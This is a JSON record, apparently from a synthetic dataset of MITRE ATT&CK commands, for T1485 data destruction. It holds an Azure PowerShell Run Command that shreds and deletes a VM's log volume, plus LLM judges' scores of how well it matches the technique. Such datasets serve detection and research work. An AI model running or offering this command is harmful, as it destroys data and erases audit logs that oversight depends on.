@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1485",
+  "platform": "IaaS",
+  "shell": "PowerShell",
+  "command": "Invoke-AzVMRunCommand -ResourceGroupName 'RG-Logs' -Name 'LinVM-LVM' -CommandId 'RunShellScript' -ScriptString \"shred -v -n 3 -z /dev/mapper/vg_data-lv_logs && lvremove -f /dev/mapper/vg_data-lv_logs\"",
+  "explanation": "Overwrites the LVM logical volume vg_data/lv_logs and then removes it, ensuring the log data is destroyed before deallocation.",
+  "rationale_steps": [
+    "Target the log LV device for direct block-level overwrite.",
+    "Securely overwrite the LV and then remove the logical volume to prevent recovery."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1485-28d85ee8-d6ff1c7f",
+  "source_prompt_hash": "28d85ee8",
+  "timestamp_utc": "2025-09-30T08:03:27.709996Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "Well-formed with balanced quoting and a valid command chain, though -Name vs -VMName and -ScriptString support can vary by Az module version.",
+        "semantic_score": 5,
+        "semantic_justification": "Executes shred with multiple passes on the LVM block device then removes the LV via lvremove using Azure RunCommand, effectively achieving data destruction aligned with T1485.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T01:06:57.360490Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell cmdlet is well-formed with balanced quotes, valid parameter names, proper use of && as a shell-level separator within the ScriptString, and correct flag syntax for both shred and lvremove.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1485 by using shred to securely overwrite the LVM logical volume three times with a final zero-pass (preventing recovery), then lvremove to deallocate the volume, all executed remotely via Azure VM Run Command — fully consistent with data destruction targeting log storage on a Linux LVM-based IaaS VM.",
+        "combined_score": 5.0,
+        "confidence": 0.93,
+        "timestamp": "2026-02-19T01:40:04.119761Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Azure PowerShell syntax is correct, and the inner shell command is properly quoted and chained with logical operators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively uses shred to overwrite a logical volume before removing it via LVM tools, which perfectly implements the Data Destruction technique.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T01:40:08.181292Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
